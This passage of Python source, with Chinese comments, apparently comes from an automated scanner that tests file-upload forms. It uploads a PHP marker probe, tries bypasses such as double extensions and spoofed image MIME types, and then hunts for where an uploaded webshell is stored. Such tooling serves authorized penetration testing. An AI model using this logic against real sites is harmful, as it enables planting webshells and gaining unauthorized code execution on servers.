                    if not page_url or page_url == source_page or page_url == action_url:
                        continue
                    try:
                        page_html = self.requester.fetch_rendered_html(page_url)
                        if not page_html:
                            continue
                        page_links = self._extract_all_links(page_html)
                        for link in page_links:
                            if any(kw in link.lower() for kw in ignore_kw):
                                continue
                            if _link_in_upload_dir(link, page_url):
                                exts_to_check = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml']
                                if any(ext in link.lower() for ext in exts_to_check):
                                    resolved = urllib.parse.urljoin(page_url, link)
                                    print(f"      [已知页面扫描 5b] 找到上传目录可执行文件: {resolved}")
                                    return resolved
                    except Exception:
                        continue

        return None

    def _extract_path_via_dom_diff(self, new_links_set: set, baseline_links: Set[str],
                                        original_filename: str, resp: Any,
                                        discovered_upload_dirs: List[str] = None) -> Optional[str]:
        """
        从新增链接和上传响应 JSON 中提取文件路径。

        策略优先级:
        1. 上传目录 + 可执行扩展名（轻量启发式，最快）
        2. UUID 前缀非严格匹配（容忍部分匹配，应对重命名截断）
        3. 图像混合扩展名（如 shell.jpg.php）
        4. 宽松兜底（任何上传目录中的可执行文件）
        """
        if not new_links_set:
            return None

        # ── 策略 0: 从上传响应 JSON / 文本中提取文件路径 ──
        # 服务端可能返回 JSON: {"success":true,"url":"/uploads/xxx.php"}
        # 或 {"data":{"filename":"xxx.php"},"path":"/uploads/..."}
        json_text = resp.text if hasattr(resp, 'text') else ''
        if len(json_text) > 5 and ('{' in json_text or '[' in json_text):
            try:
                    import json
                    parsed = json.loads(json_text)
                    found_urls = self._extract_urls_from_json(parsed)
                    for url in found_urls:
                        # 排除 CDN / JS / Vendor 等静态资源
                        if ("/" in url or "." in url) and not any(
                            kw in url.lower() for kw in ["jquery", "bootstrap", "sweetalert", "datatables",
                            "vendor/", "cdn", "jsdelivr", "/js/", "/images/", "/css/"]
                        ):
                            # 验证包含可执行文件扩展名
                            base_name = url.split('?')[0].rsplit('/', 1)[-1]
                            shell_exts = ['.php', '.phtml', '.php3', '.php4', '.php5',
                                          '.phar', '.jsp', '.jspx', '.shtml', '.asp', '.aspx']
                            if any(base_name.lower().endswith(ext) for ext in shell_exts) or '.' in base_name:
                                print(f"      [DomDiff JSON] 从响应体提取文件路径: {url}")
                                return url
            except (json.JSONDecodeError, ValueError):
                    pass
            # JSON 解析失败 → 尝试正则匹配
            import re
            json_paths = re.findall(
                    r'(?:url|path|filepath|file_url|source|src|link)\s*[:=]\s*["\x27]([^"\x27]+\.[a-z]+)["\x27]',
                    json_text, re.IGNORECASE
            )
            for jp in json_paths:
                    if any(ud in jp.lower() for ud in ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']) or any(
                        jp.lower().endswith(ext) for ext in ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
                    ):
                        print(f"      [DomDiff JSON Regex] 从响应正文提取路径: {jp}")
                        return jp

        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar',
                                '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
        # 使用发现的上传目录，如果没有则使用默认列表
        if discovered_upload_dirs:
            upload_dirs = discovered_upload_dirs
        else:
            upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
                           '/attachments/', '/user_files/',
                           '/data/', '/storage/']
        image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']

        # ── 策略 1: 上传目录 + 可执行扩展名（强信号） ──
        for link in sorted(new_links_set):
            if any(ud in link.lower() for ud in upload_dirs) and any(ext in link.lower() for ext in shell_extensions):
                    print(f"      [DomDiff Heuristic] 上传目录+可执行扩展名: {link}")
                    return link

        # ── 策略 2: 图像混合扩展名在上传目录中 (.jpg.php .png.php) ──
        for link in sorted(new_links_set):
            if any(ud in link.lower() for ud in upload_dirs):
                    base_name = link.split('?')[0].split('/')[-1]
                    # 检查是否有 图片扩展名 + 可执行扩展名的混合后缀
                    if any(ext in base_name.lower() for ext in image_exts):
                        # 提取最后一个点号之后的扩展名
                        last_ext = '.' + base_name.split('.')[-1]
                        if any(last_ext in ext for ext in shell_extensions):
                            print(f"      [DomDiff Heuristic] 图像混合扩展名: {link}")
                            return link

        # ── 策略 3: UUID 前缀部分匹配（容忍重命名截断） ──
        # 原文件名 split("_")[0] 是 UUID，重命名后可能被去掉或替换。
        # 尝试: 新文件名包含原 UUID 的部分字符 + 时间戳特征（长数字串）
        uuid_prefix = original_filename.split("_")[0] if "_" in original_filename else ""
        if uuid_prefix and len(uuid_prefix) >= 4:
            for link in sorted(new_links_set):
                    # 部分匹配: UUID 前缀的前半部分
                    partial = uuid_prefix[:4]
                    has_partial = partial in link.lower()
                    # 或者新路径包含时间戳特征（连续 8+ 位数字）
                    import re
                    has_timestamp = bool(re.search(r'\d{8,}', link))
                    has_shell_ext = any(ext in link.lower() for ext in shell_extensions)
                    if (has_partial or has_timestamp) and has_shell_ext:
                        print(f"      [DomDiff Heuristic] 后缀/时间戳部分匹配: {link} (partial={partial} ts={has_timestamp})")
                        return link

        # ── 策略 4: 任何在上传目录中的可执行扩展名文件（宽松兜底） ──
        for link in sorted(new_links_set):
            if any(ud in link.lower() for ud in upload_dirs):
                    if any(ext in link.lower() for ext in shell_extensions):
                        print(f"      [DomDiff Fallback] 上传目录可执行文件: {link}")
                        return link

        return None

    def _upload_test_file(self, action_url: str, file_param: str, form_data: Dict[str, str], accept_types: List[str], source_page: str, observation_pages: List[str], baseline_links: Set[str], discovered_upload_dirs: List[str] = None, baseline_resources: Set[str] = None) -> Optional[str]:
        """
        上传一个无害测试文件（phpinfo），找出文件存放路径规律。
        这是为后续 webshell 上传打基础：先知道真实存储 URL 格式。
        """
        print(f"\n      [探路] 上传无害测试文件 to [{action_url}] 摸底文件存储位置...")
        test_filename = f"{uuid.uuid4().hex[:6]}_test_probe.php"
        test_content = b"<?php echo 'TEST_PROBE_MARKER_A1B2C3'; ?>"
        # 探测 MIME 类型（通常图片上传接口的 MIME 类型是 image/jpeg 等）
        test_content_type = "image/jpeg" if "image" in str(accept_types).lower() else "application/x-httpd-php"

        resp = self._send_upload(action_url, file_param, test_filename, test_content, test_content_type, form_data)
        if not resp:
            print(f"      [-] 探路测试上传失败（无响应），跳过。")
            return None

        # ── 调试日志：输出上传响应，帮助诊断上传是否成功 ──
        print(f"      [探路] 上传响应 status={resp.status_code}, body[:500]={resp.text[:500]}")

        # ── 新增：上传后对比目录基线，查找任何新增 PHP 文件 ──
        # 处理服务器重命名（如 MD5 hash）的场景
        if discovered_upload_dirs:
            new_file = self._detect_new_files_in_dirs(discovered_upload_dirs, self._upload_dir_baseline or set())
            if new_file:
                print(f"      [探路✅] 通过目录对比发现新文件: {new_file}")
                # 验证是否是上传的探针（可能已被重命名）
                try:
                    test_resp = self.requester.get(new_file)
                    if test_resp and test_resp.status_code == 200:
                        # 即使探针标记不存在（被重命名），200 也说明目录可访问
                        if "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
                            print(f"      [探路✅] 新文件包含探针标记，确认可执行！")
                        else:
                            print(f"      [探路] 新文件可访问但无探针标记（可能是其他文件）")
                        self._test_file_info = {"url": new_file, "filename": test_filename, "action_url": action_url}
                        return new_file
                except Exception:
                    pass

        # ── 新增：页面级资源对比检测（目录列表被禁用时的兜底） ──
        if hasattr(self, '_page_img_baseline') and self._page_img_baseline:
            new_file = self._detect_new_page_resources(observation_pages, self._page_img_baseline)
            if new_file:
                print(f"      [探路✅] 通过页面资源对比发现新文件: {new_file}")
                try:
                    test_resp = self.requester.get(new_file)
                    if test_resp and test_resp.status_code == 200:
                        if "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
                            print(f"      [探路✅] 页面资源新文件包含探针标记，确认可执行！")
                        else:
                            print(f"      [探路] 页面资源新文件可访问但无探针标记")
                        self._test_file_info = {"url": new_file, "filename": test_filename, "action_url": action_url}
                        return new_file
                except Exception:
                    pass

        # ── 新增：内容标记检测（访问可能的文件路径，检查输出是否包含标记） ──
        # 上传的 PHP 文件如果被执行，访问该文件时会输出标记文本
        print(f"      [探路] 尝试访问可能的文件路径，查找探针标记输出...")
        probe_marker = "TEST_PROBE_MARKER_A1B2C3"

        # 生成可能的文件路径列表
        possible_paths = []
        if discovered_upload_dirs:
            base_name = test_filename.rsplit('.', 1)[0]  # 去掉扩展名
            # 尝试不同的扩展名
            for ext in ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jpg', '.png', '.gif']:
                for dir_url in discovered_upload_dirs:
                    # 原始文件名
                    possible_paths.append(urllib.parse.urljoin(dir_url, test_filename))
                    # 只改扩展名
                    possible_paths.append(urllib.parse.urljoin(dir_url, base_name + ext))

        # 访问每个可能的路径
        for file_url in possible_paths:
            try:
                file_resp = self.requester.get(file_url)
                if file_resp and file_resp.status_code == 200:
                    if probe_marker in file_resp.text:
                        print(f"      [探路✅] 文件 {file_url} 包含探针标记，确认可执行！")
                        self._test_file_info = {"url": file_url, "filename": test_filename, "action_url": action_url}
                        return file_url
                    else:
                        # 文件存在但不包含标记（可能是图片或其他内容）
                        print(f"      [探路] 文件 {file_url} 存在但不包含探针标记")
            except Exception:
                continue

        # ── 新增：扫描所有已知页面和上传目录，查找包含探针标记的内容 ──
        # 如果文件被重命名或路径未知，但页面会显示其输出，可以通过扫描发现
        print(f"      [探路] 扫描页面和目录查找探针标记输出...")
        urls_to_scan = list(observation_pages)
        if discovered_upload_dirs:
            urls_to_scan.extend(discovered_upload_dirs)

        for scan_url in urls_to_scan:
            try:
                scan_html = self.requester.fetch_rendered_html(scan_url)
                if not scan_html:
                    continue
                if probe_marker in scan_html:
                    print(f"      [探路✅] 在 {scan_url} 中发现探针标记输出！")
                    self._test_file_info = {"url": scan_url, "filename": test_filename, "action_url": action_url, "marker_found": True}
                    return scan_url
                # 也提取页面中的所有链接，检查是否指向包含标记的文件
                all_links = self._extract_all_links(scan_html)
                for link in all_links:
                    resolved_link = urllib.parse.urljoin(scan_url, link)
                    # 只检查可能是上传文件的链接
                    if any(ext in resolved_link.lower() for ext in ['.php', '.phtml', '.jpg', '.png', '.gif']):
                        try:
                            link_resp = self.requester.get(resolved_link)
                            if link_resp and link_resp.status_code == 200 and probe_marker in link_resp.text:
                                print(f"      [探路✅] 链接 {resolved_link} 包含探针标记！")
                                self._test_file_info = {"url": resolved_link, "filename": test_filename, "action_url": action_url}
                                return resolved_link
                        except Exception:
                            continue
            except Exception:
                continue

        # 尝试从响应中提取路径
        path = self._extract_webshell_path(resp, test_filename, baseline_links, action_url, "test_probe", "", source_page, observation_pages, discovered_upload_dirs, baseline_resources)
        if path:
            # 确认测试文件是否真正可访问且包含探针标记
            full_url = urllib.parse.urljoin(source_page or action_url, path)
            print(f"      [探路] 尝试访问: {full_url}")
            try:
                    test_resp = self.requester.get(full_url)
                    if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
                        print(f"      [探路✅] 成功！测试文件可访问，URL: {full_url}")
                        # 保存测试文件的文件名和后缀，用于后续文件命名推断
                        self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url}
                        return full_url
                    elif test_resp and test_resp.status_code == 200:
                        print(f"      [探路✅] 文件存在但探针未执行（可能是静态文件/重命名）。URL: {full_url}")
                        self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url, "status_code": test_resp.status_code}
                        return full_url
                    else:
                        print(f"      [探路] 文件返回 {test_resp.status_code if test_resp else 'None'}，可能 404。")
            except Exception:
                    pass

        print(f"      [探路] 未能从上传响应中定位路径，尝试扫描已知页面...")
        # 扫描已知页面找测试文件
        test_file_info = None
        shell_exts = {'.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml'}
        image_exts = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.svg'}

        for page_url in observation_pages:
            if not page_url or page_url == source_page or page_url == action_url:
                    continue
            try:
                    page_html = self.requester.fetch_rendered_html(page_url)
                    if not page_html:
                        continue
                    page_links = self._extract_all_links(page_html)
                    # ── 新增：找出所有在上传目录中的文件，对比基线发现新文件 ──
                    baseline_for_page = self._page_img_baseline.get(page_url, set()) if hasattr(self, '_page_img_baseline') else set()
                    new_files_in_dir = []
                    for link in page_links:
                        # 检查链接是否在已发现的上传目录中
                        resolved_link = urllib.parse.urljoin(page_url, link)
                        in_upload_dir = False
                        if discovered_upload_dirs:
                            for upload_dir in discovered_upload_dirs:
                                if upload_dir in resolved_link or upload_dir in link:
                                    in_upload_dir = True
                                    break
                        else:
                            # 兜底：检查常见上传目录模式
                            if "/uploads/" in link.lower() or "/files/" in link.lower() or "/upload/" in link.lower() or "/logo/" in link.lower():
                                in_upload_dir = True

                        if in_upload_dir:
                            # 检查是否是新文件（不在基线中）
                            if resolved_link not in baseline_for_page:
                                new_files_in_dir.append(resolved_link)
                                print(f"      [探路] 发现上传目录中的新文件: {resolved_link}")

                            # 尝试访问该 URL 看是否包含探针标记
                            full_test_url = urllib.parse.urljoin(page_url, link)
                            try:
                                test_resp = self.requester.get(full_test_url)
                                if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
                                    print(f"      [探路✅] 在页面 {page_url} 中找到测试文件: {full_test_url}")
                                    test_file_info = {"url": full_test_url, "filename": test_filename, "action_url": action_url}
                                    break
                            except Exception:
                                pass
                    # ── 新增：如果找到新文件但没有探针标记，也记录下来 ──
                    # 说明服务器可能重命名或转换了文件（如 PHP → JPG）
                    if not test_file_info and new_files_in_dir:
                        for new_f in new_files_in_dir:
                            parsed = urllib.parse.urlparse(new_f)
                            _, ext = os.path.splitext(parsed.path.lower())
                            # 优先选择可执行文件
                            if ext in shell_exts:
                                print(f"      [探路✅] 新文件是可执行文件: {new_f}")
                                test_file_info = {"url": new_f, "filename": test_filename, "action_url": action_url}
                                break
                        # 如果没有可执行文件，选择最新的图片文件（可能是被重命名的探针）
                        if not test_file_info:
                            for new_f in new_files_in_dir:
                                parsed = urllib.parse.urlparse(new_f)
                                _, ext = os.path.splitext(parsed.path.lower())
                                if ext in image_exts:
                                    print(f"      [探路] 新文件是图片（可能是被重命名的探针）: {new_f}")
                                    test_file_info = {"url": new_f, "filename": test_filename, "action_url": action_url, "renamed": True}
                                    break
                    if test_file_info:
                        break
            except Exception:
                    continue

        if test_file_info:
            self._test_file_info = test_file_info
            return test_file_info["url"]

        print(f"      [探路] 未能找到测试文件路径。")
        return None

    def _infer_webshell_path(self, action_url: str, source_page: str, test_url_base: str, filename: str) -> Optional[str]:
        """
        基于测试文件 URL 推断 webshell 的存储路径。
        例如：测试文件在 /uploads/abc123_test_probe.php
        → webshell 可能在 /uploads/ + UUID_hex_prefix + suffix
        """
        if not self._test_file_info or not test_url_base:
            return None

        test_filename = self._test_file_info.get("filename", "")
        test_url = self._test_file_info.get("url", "")

        # 分析测试文件 URL 规律
        # 规律可能是: /uploads/ + {timestamp}_{uuid}.{ext}
        # 或: /uploads/ + {uuid}_{strategy}.{ext}
        # 核心：测试文件 URL 的结构就是 webshell 的路径格式

        # 从 URL 中提取路径和扩展名
        import re
        url_path_match = re.search(r'(https?://[^/]+)(/[^?]+)', test_url)
        if not url_path_match:
            return None

        base_url = url_path_match.group(1)
        test_path = url_path_match.group(2)  # 例如: /uploads/abc123_test_probe.php

        # 推断 webshell 路径：用 webshell 文件名替换测试文件名
        # 如果测试文件名是 UUID_hex + _ + suffix + ext
        # 则 webshell 文件名也是 UUID_hex + _ + strategy + ext
        upload_prefix = "/uploads/"  # 或从 path 中提取
        if "/uploads/" not in test_path:
            # 尝试提取路径前缀（到最后一个 / 为止）
            path_parts = test_path.rsplit("/", 1)
            if len(path_parts) == 2:
                    upload_path_prefix = path_parts[0] + "/"
            else:
                    return None
        else:
            # 保留 /uploads/ 目录结构
            import os
            upload_path_prefix = test_path.rsplit("/", 1)[0] + "/"

        # 构造 webshell URL（保持目录结构，用新的测试文件名）
        # 注意：由于不知道服务器的重命名规则，我们无法精确构造
        # 但我们可以尝试访问测试文件 URL（如果探针成功，说明路径是对的）

        if "TEST_PROBE_MARKER_A1B2C3" in str(getattr(self._test_file_info, 'status_code', '')):
            # 测试探针成功执行了，直接返回测试 URL 用于 webshell 验证
            return test_path

        print(f"      [推断] 测试文件 URL: {test_url}")
        print(f"      [推断] 推断 webshell 路径: {upload_path_prefix}（具体文件名需依赖后续扫描）")
        return upload_path_prefix

    def _get_webshell_content(self, suffix: str) -> bytes:
        """
        根据文件后缀返回对应的无害探针内容。

        问题 5 修复：避免 PHP 内容配合图片后缀导致探针永远无法执行。
        """
        suffix_lower = suffix.lower()

        # PHP 类后缀
        if suffix_lower in ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.inc']:
            return self.webshell_content

        # ASP/ASPX 类后缀
        if suffix_lower in ['.asp', '.aspx']:
            return self.asp_webshell_content

        # JSP 类后缀
        if suffix_lower in ['.jsp', '.jspx']:
            return self.jsp_webshell_content

        # 图片或其他后缀：返回纯文本标记（用于测试文件存储路径，不期望执行）
        # 这种情况下探针不会被解析执行，但可以用于验证文件是否成功上传
        return b"VULN_VERIFIED_MARKER_UPLOAD_TEXT_ONLY"

    def _verify_and_diagnose(self, webshell_url: str, filename: str) -> Optional[DiagnosticResult]:
        """访问推算出的 Webshell URL，并交给 Diagnostic Agent 进行分析与诊断。"""
        try:
            resp = self.requester.get(webshell_url)
            if not resp:
                    return DiagnosticResult(
                        status="PATH_404",
                        is_vuln=False,
                        explanation="访问 Webshell 目标 URL 无响应",
                        recommended_action="检查网络连通性或路径格式"
                    )

            # 调用 Diagnostic Agent 进行语义诊断
            diag_res: DiagnosticResult = self._diag_chain.invoke({
                    "filename": filename,
                    "webshell_url": webshell_url,
                    "status_code": resp.status_code,
                    "response_text": resp.text[:1500] if resp.text else "(Empty Body)"
            })
            return diag_res

        except Exception as e:
            print(f"      [-] Webshell 验证访问失败: {e}")
            return None

    def _send_upload(self, url: str, param: str, filename: str, content: bytes, content_type: str, data: Dict[str, str]):
        """执行物理上传 POST 请求。"""
        files = {param: (filename, content, content_type)}
        try:
            return self.requester.post(url, files=files, data=data)
        except Exception as e:
            print(f"      [-] 上传 POST 请求异常: {e}")
            return None

    def _extract_all_links(self, html_content: str) -> Set[str]:
        """提取 HTML 中的资源路径与正则表达式提取。"""
        links = set()
        if not html_content: return links
        soup = BeautifulSoup(html_content, "html.parser")
        for tag in soup.find_all(True):
            for attr in ["src", "href", "data-src", "data-url", "data-file"]:
                    link = tag.get(attr)
                    if link and isinstance(link, str):
                        links.add(link)
        pattern = r'[\'"](/[^ \'"<>\n]+\.[a-zA-Z0-9]+)[\'"]|[\'"](http[^\'"<>\n]+\.[a-zA-Z0-9]+)[\'"]'
        for match in re.findall(pattern, html_content):
            for m in match:
                    if m: links.add(m)
        return links

    def _find_best_shell_path(self, before_links: Set[str], after_links: Set[str], original_filename: str) -> Optional[str]:
        """
        评分对比寻找最佳 Webshell 路径 —— 支持服务器重命名场景。

        评分标准（最高分胜出）:
          - 上传目录: +10
          - 可执行扩展名: +10
          - 图像混合扩展名 (.jpg.php / .png.php): +10
          - 路径层级 ≤ 4: +5
          - 无查询字符串: +3
          - UUID 前缀匹配（未重命名场景）: +20

        重命名时: upload_dir(10) + shell_ext(10) = 20 分
        足以高于只有单一扩展名的误报 (10 分)。
        """
        new_links = after_links - before_links
        if not new_links:
            return None

        best_path, max_score = None, -1
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.inc',
                                '.jsp', '.jspx', '.asp', '.aspx', '.shtml']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
                           '/attachments/', '/user_files/', '/data/', '/storage/']
        image_exts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']

        uuid_prefix = original_filename.split("_")[0] if "_" in original_filename else ""

        for link in new_links:
            score = 0
            link_lower = link.lower()

            if any(ud in link_lower for ud in upload_dirs):
                    score += 10
            if any(ext in link_lower for ext in shell_extensions):
                    score += 10
            # 图像混合扩展名（如 shell.jpg.php），配合绕过测试
            if '.' in link:
                    base_name = link.split('?')[0].split('/')[-1]
                    if any(ext in base_name.lower() for ext in image_exts):
                        score += 10
            # 短路径更可能是直接上传（非深层 CMS 路径）
            if link.count('/') <= 4:
                    score += 5
            # 无查询字符串通常表示磁盘上的静态文件
            if '?' not in link:
                    score += 3
            # UUID 前缀未丢失时额外 +20
            if uuid_prefix and uuid_prefix in link:
                    score += 20

            if score > max_score:
                    max_score, best_path = score, link

        return best_path if max_score > 0 else None

    def _find_fallback_shell_path(self, before_links: Set[str], after_links: Set[str],
                                       strat_name: str, _min_score: int = 10) -> Optional[str]:
        """
        宽松兜底：评分排序替代无序 set 的 first-match-wins。
        需要至少一个强信号（上传目录 OR 扩展名）才返回。
        """
        new_links = after_links - before_links
        if not new_links:
            return None

        best_path, max_score = None, -1
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/']

        for link in new_links:
            score = 0
            link_lower = link.lower()
            if any(ud in link_lower for ud in upload_dirs):
                    score += 5
            if any(ext in link_lower for ext in shell_extensions):
                    score += 5
            if score > max_score:
                    max_score, best_path = score, link

        return best_path if max_score >= _min_score else None

    def _detect_new_files_in_dirs(self, upload_dirs: List[str], baseline_files: Set[str]) -> Optional[str]:
        """
        对比上传目录的当前文件列表与基线，找出新增文件。

        用于检测服务器重命名场景（如 MD5 hash），此时文件名与上传时不同，
        但目录中会多出一个新文件。

        Args:
            upload_dirs: 上传目录 URL 列表
            baseline_files: 上传前目录中的文件 URL 集合

        Returns:
            新发现的 PHP 文件 URL，或 None
        """
        if not upload_dirs:
            return None

        shell_exts = {'.php', '.phtml', '.php3', '.php4', '.php5', '.phar'}

        for upload_dir in upload_dirs:
            try:
                # 确保是完整 URL
                if not upload_dir.startswith(('http://', 'https://')):
                    print(f"      [NewFile Detect] 跳过非完整 URL: {upload_dir}")
                    continue

                dir_resp = self.requester.get(upload_dir)
                if not dir_resp or dir_resp.status_code != 200:
                    continue

                # 提取当前目录中的所有文件链接
                current_files = set()
                dir_links = self._extract_all_links(dir_resp.text)
                for link in dir_links:
                    resolved = urllib.parse.urljoin(upload_dir, link)
                    current_files.add(resolved)
                # 也尝试正则提取
                for m in re.findall(r'href=["\']([^"\']+)["\']', dir_resp.text, re.I):
                    resolved = urllib.parse.urljoin(upload_dir, m)
                    current_files.add(resolved)

                # 找出新增文件
                new_files = current_files - baseline_files
                for new_file in new_files:
                    # 只关注可执行文件
                    parsed = urllib.parse.urlparse(new_file)
                    path_lower = parsed.path.lower()
                    if any(path_lower.endswith(ext) for ext in shell_exts):
                        print(f"      [NewFile Detect] 在 {upload_dir} 发现新文件: {new_file}")
                        return new_file

            except Exception as e:
                print(f"      [NewFile Detect] 扫描目录 {upload_dir} 失败: {e}")
                continue

        return None

    def _collect_page_resource_urls(self, page_url: str) -> set:
        """
        收集页面中所有 img src / link href / script src 的完整 URL。
        用于上传前后对比，发现新增的资源引用。
        """
        urls = set()
        try:
            html = self.requester.fetch_rendered_html(page_url)
            if not html:
                return urls
            # 提取 img src
            for m in re.findall(r'<img[^>]+src=["\']([^"\']+)["\']', html, re.I):
                urls.add(urllib.parse.urljoin(page_url, m))
            # 提取 link href
            for m in re.findall(r'<link[^>]+href=["\']([^"\']+)["\']', html, re.I):
                urls.add(urllib.parse.urljoin(page_url, m))
            # 提取 script src
            for m in re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.I):
                urls.add(urllib.parse.urljoin(page_url, m))
            # 提取 a href（可能指向上传文件）
            for m in re.findall(r'<a[^>]+href=["\']([^"\']+)["\']', html, re.I):
                urls.add(urllib.parse.urljoin(page_url, m))
        except Exception:
            pass
        return urls

    def _detect_new_page_resources(self, observation_pages: List[str], baseline: Dict[str, set]) -> Optional[str]:
        """
        对比上传前后页面的资源 URL，找出新增的可执行文件引用。
        用于目录列表被禁用时的兜底检测。
        """
        shell_exts = {'.php', '.phtml', '.php3', '.php4', '.php5', '.phar'}
        for page_url in observation_pages:
            try:
                current_urls = self._collect_page_resource_urls(page_url)
                old_urls = baseline.get(page_url, set())
                new_urls = current_urls - old_urls
                for u in new_urls:
                    parsed = urllib.parse.urlparse(u)
                    if any(parsed.path.lower().endswith(ext) for ext in shell_exts):
                        print(f"      [PageImg Diff] 页面 {page_url} 新增资源: {u}")
                        return u
            except Exception:
                continue
        return None

    def _scan_discovered_upload_dirs(self, upload_dirs: List[str], filename: str,
                                      action_url: str, source_page: str) -> Optional[str]:
        """
        扫描从页面 img src 等链接中发现的上传目录，寻找上传的 webshell。

        当 DOM 差异对比失败时，直接访问这些目录尝试找到文件。
        适用于：
        - 页面已有 <img src="/uploads/logo.png"> 但上传后没有新增链接
        - 服务器替换了旧文件而不是新增
        - 上传目录可列出文件
        """
        if not upload_dirs:
            return None

        # 构建可能的文件名变体（服务器可能重命名）
        # 原始文件名: abc12345_shell.php
        # 可能的变体: shell.php, logo_shell.php, abc12345_shell.php
        base_name = filename.split("_", 1)[-1] if "_" in filename else filename  # shell.php
        uuid_prefix = filename.split("_")[0] if "_" in filename else ""  # abc12345

        # 要尝试的文件名模式
        filename_patterns = [
            filename,  # 完整文件名
            base_name,  # 去掉 UUID 前缀
        ]

        # 常见后缀变体（服务器可能添加时间戳等）
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar']
        base_without_ext = base_name.rsplit('.', 1)[0] if '.' in base_name else base_name

        for upload_dir in upload_dirs:
            # 确保 upload_dir 是完整的 URL
            if upload_dir.startswith('/'):
                # 相对路径，需要拼接基础 URL
                base_url = source_page or action_url
                if base_url:
                    parsed = urllib.parse.urlparse(base_url)
                    upload_dir = f"{parsed.scheme}://{parsed.netloc}{upload_dir}"
                else:
                    continue

            # 尝试直接访问目录（某些服务器允许目录列表）
            try:
                resp = self.requester.get(upload_dir)
                if resp and resp.status_code == 200:
                    # 检查响应中是否包含我们的文件名
                    resp_text = resp.text.lower()
                    for pattern in filename_patterns:
                        if pattern.lower() in resp_text:
                            # 找到了！提取完整 URL
                            found_url = urllib.parse.urljoin(upload_dir, pattern)
                            print(f"      [UploadDir Scan] 在目录列表中找到: {found_url}")
                            return found_url
            except Exception:
                pass

            # 尝试直接访问可能的文件路径
            for pattern in filename_patterns:
                file_url = urllib.parse.urljoin(upload_dir, pattern)
                try:
                    resp = self.requester.get(file_url)
                    if resp and resp.status_code == 200:
                        # 检查是否是我们的 webshell（包含探针标记）
                        if "VULN_VERIFIED_MARKER_UPLOAD" in resp.text:
                            print(f"      [UploadDir Scan] 直接访问找到 webshell: {file_url}")
                            return file_url
                except Exception:
                    pass

        return None

    def _playwright_capture_network_resources(self, target_url: str, cookies: list = None) -> Set[str]:
        """
        使用 Playwright 打开页面，捕获所有网络请求的资源 URL。

        用于检测上传后页面加载的新资源（如新上传的图片、文件等）。
        可以捕获：
        - <img src="..."> 加载的图片
        - <script src="..."> 加载的脚本
        - <link href="..."> 加载的样式
        - AJAX/Fetch 请求的资源
        - 动态生成的资源 URL

        Args:
            target_url: 要打开的页面 URL
            cookies: requests 会话的 cookies（用于保持登录状态）

        Returns:
            Set[str]: 捕获到的所有资源 URL 集合
        """
        captured_urls = set()

        try:
            from playwright.sync_api import sync_playwright
            import urllib.parse

            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context(ignore_https_errors=True)

                # 转换 cookies 格式
                if cookies:
                    pw_cookies = []
                    parsed_url = urllib.parse.urlparse(target_url)
                    domain = parsed_url.hostname
                    for c in cookies:
                        pw_cookies.append({
                            "name": c.name,
                            "value": c.value,
                            "domain": c.domain or domain,
                            "path": c.path or "/"
                        })
                    context.add_cookies(pw_cookies)

                page = context.new_page()

                # 定义网络请求拦截回调
                def handle_response(response):
                    """捕获所有响应 URL"""
                    url = response.url
                    # 排除一些明显的静态资源（框架、库等）
                    exclude_keywords = [
                        'jquery', 'bootstrap', 'sweetalert', 'datatables',
                        'vendor/', 'cdn', 'jsdelivr', 'google-analytics',
                        'facebook', 'twitter', 'gtag', 'analytics'
                    ]
                    if not any(kw in url.lower() for kw in exclude_keywords):
                        captured_urls.add(url)

                page.on("response", handle_response)

                try:
                    # 打开页面，等待网络空闲
                    page.goto(target_url, wait_until="networkidle", timeout=15000)
                    # 额外等待一下，确保动态加载的资源也被捕获
                    page.wait_for_timeout(2000)
                except Exception as e:
                    print(f"      [Playwright Capture] 页面加载异常: {e}")
                finally:
                    browser.close()

        except ImportError:
            print(f"      [Playwright Capture] Playwright 未安装，跳过网络资源捕获")
        except Exception as e:
            print(f"      [Playwright Capture] 捕获失败: {e}")

        return captured_urls

    def _playwright_capture_with_refresh(self, target_url: str, cookies: list = None) -> tuple:
        """
        使用 Playwright 打开页面，刷新后捕获网络资源和 DOM 链接。

        增强功能：
        - 打开页面后主动刷新（模拟 F5），触发数据重新加载
        - 等待 JS 渲染完成
        - 提取 DOM 中的 img src、a href 等资源

        Args:
            target_url: 要打开的页面 URL
            cookies: requests 会话的 cookies（用于保持登录状态）

        Returns:
            tuple: (network_resources, dom_links)
                - network_resources: 网络请求捕获的资源 URL 集合
                - dom_links: DOM 中提取的 img src、a href 等链接集合
        """
        network_resources = set()
        dom_links = set()

        try:
            from playwright.sync_api import sync_playwright
            import urllib.parse

            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                context = browser.new_context(ignore_https_errors=True)

                # 转换 cookies 格式
                if cookies:
                    pw_cookies = []
                    parsed_url = urllib.parse.urlparse(target_url)
                    domain = parsed_url.hostname
                    for c in cookies:
                        pw_cookies.append({
                            "name": c.name,
                            "value": c.value,
                            "domain": c.domain or domain,
                            "path": c.path or "/"
                        })
